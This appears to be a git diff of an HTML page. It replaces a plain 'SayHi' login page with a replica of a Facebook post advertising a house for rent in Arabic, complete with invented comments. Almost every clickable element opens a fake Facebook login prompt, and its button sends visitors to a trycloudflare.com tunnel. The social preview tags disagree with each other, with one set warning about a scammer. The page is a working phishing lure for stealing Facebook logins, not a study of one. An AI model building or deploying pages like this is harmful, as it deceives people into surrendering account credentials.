@@ -1,292 +1,365 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>تسجيل الدخول - SayHi</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet" />
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      font-family: 'Cairo', sans-serif;
-      height: 100%;
-      background: linear-gradient(135deg, #ff758c, #ff7eb3);
-      direction: rtl;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Facebook Post Replica</title>
 
-    /* شاشة الشعار (Splash) */
-    #splash {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-      flex-direction: column;
-      transition: opacity 0.5s ease;
-    }
+    <!-- 👇 Meta Tags لعرض المعاينة في فيسبوك وتويتر -->
+    <meta property="og:title" content="  حوش للايجار في حجارة" />
+    <meta property="og:description" content=" حوش للايجار في حجارة ثلاث غرف وسط حوش مطبخ حمام جنان صغير الايجار 600 دينار مطلوب راش و رويس" />
+    <meta property="og:image" content="https://i.imgur.com/HiQKCw1.jpeg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://adksahak.github.io/my-facebook-page/" />
+    <meta property="og:locale" content="ar_AR" />
 
-    #splash.hide {
-      opacity: 0;
-      pointer-events: none;
-    }
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="تحذير هام - نصاب في زليتن" />
+    <meta name="twitter:description" content="انشر باش توصل لأكبر عدد من الناس! هذا النصاب محتال خطير ومطلوب..." />
+    <meta name="twitter:image" content="https://i.imgur.com/SwsAZhH.jpeg" />
 
-    #splash img {
-      width: 120px;
-      height: 120px;
-      margin-bottom: 20px;
-    }
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'facebook-primary': '#1877f2',
+                        'facebook-gray': '#f0f2f5',
+                        'facebook-dark-gray': '#65676B',
+                        'facebook-light-gray': '#E4E6EB',
+                        'facebook-icon-gray': '#606770'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;400;500;600;700&display=swap');
+        body {
+            font-family: 'Noto Sans Arabic', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+        }
+        .fb-post-shadow {
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .reactions-bg {
+            background-color: #f0f2f5;
+            border-radius: 18px;
+            padding: 0 6px;
+        }
+        .post-text {
+            word-wrap: break-word;
+            white-space: pre-line;
+            line-height: 1.333;
+        }
+        .comment-input:focus-within {
+            background-color: white;
+        }
+        .reaction-button.text-blue-600 {
+            color: #1877f2;
+        }
+        .profile-pic {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            overflow: hidden;
+            flex-shrink: 0;
+            background-color: transparent !important;
+            cursor: pointer;
+        }
+        .profile-pic img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .comment .profile-pic {
+            width: 32px;
+            height: 32px;
+        }
 
-    #splash h2 {
-      color: #ff6f91;
-      font-size: 24px;
-      font-weight: 700;
-    }
-
-    /* المحتوى الرئيسي - مخفي بالبداية */
-    #main-content {
-      display: none;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    /* نفس تصميم الصفحة السابقة */
-    .login-container {
-      background: #fff;
-      padding: 40px 30px;
-      border-radius: 20px;
-      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
-      width: 90%;
-      max-width: 400px;
-      text-align: center;
-      box-sizing: border-box;
-    }
-
-    h1 {
-      margin-bottom: 25px;
-      color: #333;
-      font-size: 24px;
-    }
-
-    a {
-      text-decoration: none;
-    }
-
-    .social-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      width: 100%;
-      padding: 12px;
-      margin: 6px 0;
-      border-radius: 10px;
-      font-weight: bold;
-      font-size: 14px;
-      transition: 0.3s;
-      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
-      border: none;
-      cursor: pointer;
-    }
-
-    .social-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-    }
-
-    .google {
-      background-color: #ffffff;
-      color: #444;
-      border: 1px solid #ddd;
-    }
-
-    .facebook {
-      background-color: #1877f2;
-      color: white;
-    }
-
-    .apple {
-      background-color: #000;
-      color: white;
-    }
-
-    .social-btn svg {
-      width: 20px;
-      height: 20px;
-      margin-left: 10px;
-      flex-shrink: 0;
-    }
-
-    .or {
-      margin: 20px 0 10px;
-      font-size: 14px;
-      color: #666;
-      position: relative;
-    }
-
-    .or::before, .or::after {
-      content: "";
-      position: absolute;
-      top: 50%;
-      width: 40%;
-      height: 1px;
-      background-color: #ccc;
-    }
-
-    .or::before {
-      right: 10%;
-    }
-
-    .or::after {
-      left: 10%;
-    }
-
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 6px 0;
-      border-radius: 10px;
-      border: 1px solid #ccc;
-      font-size: 14px;
-      transition: 0.2s;
-      box-sizing: border-box;
-    }
-
-    input:focus {
-      border-color: #ff6f91;
-      outline: none;
-      box-shadow: 0 0 5px rgba(255, 111, 145, 0.4);
-    }
-
-    .login-btn {
-      width: 100%;
-      padding: 12px;
-      background-color: #ff6f91;
-      border: none;
-      color: white;
-      font-size: 16px;
-      border-radius: 10px;
-      cursor: pointer;
-      margin-top: 10px;
-      transition: 0.3s;
-    }
-
-    .login-btn:hover {
-      background-color: #e05578;
-    }
-
-    /* Responsive */
-    @media (max-width: 480px) {
-      .login-container {
-        padding: 140px 20px;
-        border-radius: 15px;
-        width: 95%;
-      }
-
-      h1 {
-        font-size: 20px;
-        margin-bottom: 20px;
-      }
-
-      .social-btn {
-        font-size: 13px;
-        padding: 10px;
-        margin: 4px 0;
-        border-radius: 8px;
-      }
-
-      .social-btn svg {
-        width: 18px;
-        height: 18px;
-        margin-left: 8px;
-      }
-
-      input {
-        font-size: 13px;
-        padding: 10px;
-        margin: 5px 0;
-        border-radius: 8px;
-      }
-
-      .login-btn {
-        font-size: 15px;
-        padding: 10px;
-        border-radius: 8px;
-        margin-top: 8px;
-      }
-
-      .or {
-        font-size: 12px;
-        margin: 15px 0 8px;
-      }
-
-      .or::before, .or::after {
-        width: 30%;
-      }
-    }
-  </style>
+        /* مودال تسجيل الدخول */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .modal {
+            background: white;
+            border-radius: 12px;
+            width: 350px;
+            max-width: 90%;
+            padding: 1.5rem 1.5rem 2.5rem;
+            position: relative;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+            direction: rtl;
+        }
+        .modal img.facebook-logo {
+            width: 50px;
+            margin: 0 auto 1rem;
+            display: block;
+        }
+        .modal .close-btn {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            font-size: 1.25rem;
+            color: #555;
+            cursor: pointer;
+            font-weight: 700;
+            border: none;
+            background: transparent;
+            transition: color 0.2s ease;
+        }
+        .modal .close-btn:hover {
+            color: #1877f2;
+        }
+        .modal h2 {
+            margin-bottom: 1rem;
+            font-weight: 600;
+            color: #1877f2;
+            font-size: 1.25rem;
+        }
+        .modal p {
+            font-size: 0.9rem;
+            margin-bottom: 1.5rem;
+            color: #333;
+        }
+        .modal button.login-btn {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            font-weight: 600;
+            padding: 0.6rem 0;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background-color 0.3s ease;
+        }
+        .modal button.login-btn:hover {
+            background-color: #165dcb;
+        }
+    </style>
 </head>
-<body>
-  <!-- شاشة الشعار -->
-  <div id="splash">
-    <img src="https://sdmntprnortheu.oaiusercontent.com/files/00000000-b9e8-61f4-88db-fb260ec7962c/raw?se=2025-06-09T16%3A20%3A01Z&sp=r&sv=2024-08-04&sr=b&scid=dfb87d04-6040-5b79-97cb-7da3a993a1e3&skoid=eb780365-537d-4279-a878-cae64e33aa9c&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2025-06-09T15%3A12%3A35Z&ske=2025-06-10T15%3A12%3A35Z&sks=b&skv=2024-08-04&sig=wHFfjMIotF3T9mYBe3/nJ2EZO9ohzzXF8yy78M0hvQ4%3D" alt="شعار التطبيق" />
-    <h2>SayHi</h2>
-  </div>
+<body class="bg-facebook-gray flex justify-center items-center min-h-screen p-4">
 
-  <!-- المحتوى الرئيسي -->
-  <div id="main-content">
-    <div class="login-container">
-      <h1>تسجيل الدخول إلى SayHi</h1>
+    <div class="w-full max-w-[500px] bg-white rounded-lg overflow-hidden fb-post-shadow">
+        <!-- Post Header -->
+        <div class="flex items-center p-3">
+            <div class="profile-pic">
+                <img src="https://i.imgur.com/bJIqG8n.jpeg" alt="صورة محمد" />
+            </div>
+            <div class="flex-1 mr-3">
+                <div class="flex items-center">
+                    <h3 class="font-semibold text-[15px] profile-name" style="cursor:pointer;"> علي عبدالله   </h3>
+                      <span class="ml-1.5 text-facebook-dark-gray">
+                           <i class="fas fa-globe-americas text-[11px]"></i>
+                    </span>
+                </div>
+                <div class="flex items-center text-facebook-dark-gray">
+                    <span class="text-xs"> ١ س   </span>
+                    <span class="mx-1">·</span>
+                    <i class="fas fa-user-friends text-[10px]"></i>
+                </div>
+            </div>
+            <div class="relative">
+                <button class="w-8 h-8 rounded-full hover:bg-facebook-light-gray flex items-center justify-center">
+                    <i class="fas fa-ellipsis-h text-facebook-icon-gray"></i>
+                </button>
+            </div>
+        </div>
 
-      <a href="https://accounts.google.com/" target="_blank" rel="noopener noreferrer">
-        <button class="social-btn google" type="button" aria-label="تسجيل الدخول عبر جوجل">
-          <svg viewBox="0 0 533.5 544.3" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M533.5 278.4c0-17.8-1.6-35-4.6-51.6H272v97.6h147.6c-6.4 34.8-25.4 64.3-54.3 84.2l87.7 68.2c51.3-47.3 80.5-117.2 80.5-198.4z"/><path fill="#34A853" d="M272 544.3c72.6 0 133.4-24.1 177.8-65.2l-87.7-68.2c-24.3 16.3-55.5 25.9-90.1 25.9-69 0-127.4-46.5-148.3-109.1H33.8v68.4c44.4 87.9 135.9 148.2 238.2 148.2z"/><path fill="#FBBC05" d="M123.7 327.7c-10.5-31.2-10.5-64.8 0-96l-68.5-68.4C18.5 221.1 0 271.1 0 326.1s18.5 105 55.2 145.7l68.5-68.4z"/><path fill="#EA4335" d="M272 107.3c39.5-.6 76.7 13.6 105.5 39.4l79-79C417.2 24.4 346.3-1.3 272 0 169.7 0 78.2 60.2 33.8 148.2l68.5 68.4C144.6 153.8 203 107.3 272 107.3z"/></svg>
-          سجل دخول عبر جوجل
-        </button>
-      </a>
+        <!-- Post Content -->
+        <div class="px-4 pb-3">
+            <div class="post-text text-[15px] mb-3" style="cursor:pointer;">
+                <p class="mb-1">حوش للايجار</p>
+                <p class="mb-1">عرض حوش للايجار في حجارة ثلاث غرف وسط حوش مطلح حمام جنان صغير سعر الايجار 600 دينار مطلوب رائس و رويس فقط
+                  للاستفسار يرجي التواصل ع الخاص</p>
+            </div>
 
-      <a href="https://www.facebook.com/login/" target="_blank" rel="noopener noreferrer">
-        <button class="social-btn facebook" type="button" aria-label="تسجيل الدخول عبر فيسبوك">
-          <svg viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg"><path fill="white" d="M279.14 288l14.22-92.66h-88.91V141.09c0-25.35 12.42-50.06 52.24-50.06H293V6.26S259.36 0 225.36 0c-73.12 0-121.19 44.38-121.19 124.72V195.3H22.89V288h81.28v224h100.17V288z"/></svg>
-          سجل دخول عبر فيسبوك
-        </button>
-      </a>
+            <!-- Post Image -->
+            <div class="w-full mb-3 rounded-lg overflow-hidden">
+                <img src="https://i.imgur.com/HiQKCw1.jpeg" alt="اجتماع الشركة" class="w-full h-auto object-cover post-image" />
+            </div>
+            
+            <div class="flex items-center mt-1 text-facebook-dark-gray text-[13px]">
+                <div class="reactions-bg flex items-center">
+                    <div class="flex items-center -space-x-1">
+                        <div class="w-4 h-4 rounded-full bg-gradient-to-r from-blue-600 to-blue-800 flex items-center justify-center">
+                            <i class="fas fa-thumbs-up text-white text-[8px]"></i>
+                        </div>
+                        <div class="w-4 h-4 rounded-full bg-gradient-to-r from-red-500 to-pink-600 flex items-center justify-center">
+                            <i class="fas fa-heart text-white text-[8px]"></i>
+                        </div>
+                    </div>
+                    <span class="mr-1">8</span>
+                </div>
+                <div class="mr-3"><span>3 تعليقًا</span></div>
+                <div><span>4 مشاركة</span></div>
+            </div>
+        </div>
 
-      <a href="https://appleid.apple.com/" target="_blank" rel="noopener noreferrer">
-        <button class="social-btn apple" type="button" aria-label="تسجيل الدخول عبر أبل">
-          <svg viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path fill="white" d="M318.7 268.7c-.1-51.3 41.8-75.8 43.7-77.1-24-35-61.3-39.8-74.5-40.4-31.7-3.2-62.1 18.7-78.2 18.7-16.2 0-41.2-18.3-67.8-17.8-34.9.5-67 20.4-85.3 52.1-36.6 63.5-9.3 157.2 26.3 208.7 17.4 26.3 38.1 55.8 65.3 54.7 26.3-1.1 36.2-17.1 67.9-17.1 31.7 0 40.8 17.1 68.5 16.6 28.2-.4 46-26.7 63.4-53 19.8-29 27.9-57 28.2-58.5-.6-.3-54.1-20.9-54.2-82.7zM266.7 97.3c14.9-18 25-43.1 22.3-68-21.5.9-47.5 14.4-62.8 32.4-13.8 16-25.9 41.8-22.6 66.3 23.9 1.9 48.4-12.1 63.1-30.7z"/></svg>
-          سجل دخول عبر أبل
-        </button>
-      </a>
+        <!-- Action Buttons -->
+        <div class="flex border-t border-facebook-light-gray mx-3">
+            <button class="flex-1 py-2 flex items-center justify-center hover:bg-facebook-light-gray rounded-md text-facebook-dark-gray reaction-button" data-type="like" style="cursor:pointer;">
+                <i class="far fa-thumbs-up mr-1.5 text-facebook-icon-gray"></i>
+                <span class="text-sm font-medium">أعجبني</span>
+            </button>
+            <button class="flex-1 py-2 flex items-center justify-center hover:bg-facebook-light-gray rounded-md text-facebook-dark-gray reaction-button" data-type="comment" style="cursor:pointer;">
+                <i class="far fa-comment mr-1.5 text-facebook-icon-gray"></i>
+                <span class="text-sm font-medium">تعليق</span>
+            </button>
+            <button class="flex-1 py-2 flex items-center justify-center hover:bg-facebook-light-gray rounded-md text-facebook-dark-gray share-button" style="cursor:pointer;">
+                <i class="far fa-share-square mr-1.5 text-facebook-icon-gray"></i>
+                <span class="text-sm font-medium">مشاركة</span>
+            </button>
+        </div>
 
-      <p class="or">أو باستخدام البريد الإلكتروني</p>
+        <!-- Comments -->
+        <div class="bg-facebook-gray px-4 py-3">
+            <div class="flex mb-3 comment">
+                <div class="profile-pic" style="cursor:pointer;">
+                    <img src="https://scd.infomigrants.net/media/resize/my_image_big/bf2bd6f8e71fb696c3560d516c2b3be58fe78cc7.jpg" alt="عادل" />
+                </div>
+                <div class="bg-white rounded-2xl mr-2 py-2 px-3 flex-1">
+                    <div class="font-medium text-[13px] profile-name" style="cursor:pointer;">عادل زمرينه</div>
+                    <div class="text-[15px] mt-1">وين في حجارة و هل في مكان للسيارة</div>
+                    <div class="flex items-center text-facebook-dark-gray text-[12px] mt-2">
+                        <span>أعجبني</span>
+                        <span class="mx-1">·</span>
+                        <span>رد</span>
+                        <span class="mx-1">·</span>
+                        <span>منذ 15 دقيقة</span>
+                    </div>
+                </div>
+            </div>
 
-      <form>
-        <input type="email" placeholder="البريد الإلكتروني" required />
-        <input type="password" placeholder="كلمة المرور" required />
-        <button type="submit" class="login-btn">تسجيل الدخول</button>
-      </form>
+            <div class="flex mb-3 ml-4 comment">
+                <div class="profile-pic" style="cursor:pointer;">
+                    <img src="https://aresmaxima.com/wp-content/uploads/2023/03/Screenshot-2023-03-26-at-00-55-06-Armored-Vehicles-RDG-Offer.docx-Armored-Vehicles-RDG-Offer.docx-1.pdf.png" alt="محمد" />
+                </div>
+                <div class="bg-white rounded-2xl mr-2 py-2 px-3 flex-1">
+                    <div class="font-medium text-[13px] profile-name" style="cursor:pointer;">محمد فكرون</div>
+                    <div class="text-[15px] mt-1">كلمتك خاص</div>
+                    <div class="flex items-center text-facebook-dark-gray text-[12px] mt-2">
+                        <span>أعجبني</span>
+                        <span class="mx-1">·</span>
+                        <span>رد</span>
+                        <span class="mx-1">·</span>
+                        <span>منذ 3 دقائق</span>
+                    </div>
+                </div>
+            </div>
+
+ <div class="flex mb-3 ml-4 comment">
+                <div class="profile-pic" style="cursor:pointer;">
+                    <img src="https://cdn-images.dzcdn.net/images/cover/cd768841c6472456aa994b5b9b8a1468/500x500-000000-80-0-0.jpg" alt="محمد" />
+                </div>
+                <div class="bg-white rounded-2xl mr-2 py-2 px-3 flex-1">
+                    <div class="font-medium text-[13px] profile-name" style="cursor:pointer;">عادل جمعه</div>
+                    <div class="text-[15px] mt-1">وين المكان بالضبط</div>
+                    <div class="flex items-center text-facebook-dark-gray text-[12px] mt-2">
+                        <span>أعجبني</span>
+                        <span class="mx-1">·</span>
+                        <span>رد</span>
+                        <span class="mx-1">·</span>
+                        <span>الان</span>
+                    </div>
+                </div> 
+            </div>
+
+            <div class="flex">
+                <div class="profile-pic">
+                    <img src="https://i.pinimg.com/736x/8a/ac/6a/8aac6a8844f8db0866b6782f20c98f7d.jpg" alt="تعليق جديد" />
+                </div>
+                <div class="flex-1 flex items-center bg-white rounded-full h-9 py-1 px-3 ml-2 comment-input">
+                    <input type="text" placeholder="أكتب تعليقاً..." class="w-full h-full bg-transparent outline-none border-none text-[15px]" />
+                    <div class="flex space-x-2">
+                        <button class="w-6 h-6 text-facebook-icon-gray"><i class="far fa-smile"></i></button>
+                        <button class="w-6 h-6 text-facebook-icon-gray"><i class="fas fa-camera"></i></button>
+                        <button class="w-6 h-6 text-facebook-icon-gray"><i class="fas fa-gift"></i></button>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-  </div>
 
-  <script>
-    window.addEventListener('load', () => {
-      setTimeout(() => {
-        const splash = document.getElementById('splash');
-        splash.classList.add('hide');
+    <!-- مودال تسجيل الدخول -->
+    <div class="modal-overlay" id="loginModal">
+        <div class="modal" role="dialog" aria-modal="true" aria-labelledby="loginTitle">
+            <button class="close-btn" id="modalCloseBtn" aria-label="إغلاق النافذة">&times;</button>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo" class="facebook-logo" />
+            <h2 id="loginTitle" style="color: black;">استفد من التجربة الكاملة</h2>
+            <p>قم بتسجيل الدخول للاطلاع علي المحتوي</p>
+            <button class="login-btn" id="loginBtn">تسجيل الدخول</button>
+        </div>
+    </div>
 
-        setTimeout(() => {
-          splash.style.display = 'none';
-          document.getElementById('main-content').style.display = 'flex';
-        }, 500); // مدة تزامن مع الإختفاء التدريجي
-      }, 3000); // 3 ثواني
-    });
-  </script>
+    <script>
+        // جلب عناصر النوافذ والأزرار
+        const loginModal = document.getElementById('loginModal');
+        const modalCloseBtn = document.getElementById('modalCloseBtn');
+        const loginBtn = document.getElementById('loginBtn');
+
+        // فتح النافذة عند الضغط على الأزرار أو الصور أو الأسماء (حسب المطلوب)
+        // اختر كل العناصر التي يجب أن تفتح النافذة
+        const triggerSelectors = [
+            '.reaction-button',  // أعجبني وتعليق
+            '.share-button',     // مشاركة
+            '.profile-pic img',  // صور البروفيلات
+            '.profile-name',     // أسماء البروفيلات
+          '.post-image'        // صورة المنشور الكبيرة
+];
+
+        // نضيف لكل العناصر المستهدفة حدث النقر ليظهر المودال
+        triggerSelectors.forEach(selector => {
+            document.querySelectorAll(selector).forEach(el => {
+                el.style.cursor = 'pointer';
+                el.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    showLoginModal();
+                });
+            });
+        });
+
+        function showLoginModal() {
+            loginModal.style.display = 'flex';
+        }
+
+        function hideLoginModal() {
+            loginModal.style.display = 'none';
+        }
+
+        // إغلاق النافذة عند الضغط على زر الإغلاق
+        modalCloseBtn.addEventListener('click', () => {
+            hideLoginModal();
+        });
+
+        // إغلاق النافذة عند الضغط خارجها
+        loginModal.addEventListener('click', (e) => {
+            if(e.target === loginModal) {
+                hideLoginModal();
+            }
+        });
+
+        // زر تسجيل الدخول يوجه إلى الرابط المطلوب
+        loginBtn.addEventListener('click', () => {
+            window.location.href = 'https://issue-platforms-assume-husband.trycloudflare.com/';
+        });
+    </script>
 </body>
 </html>
-
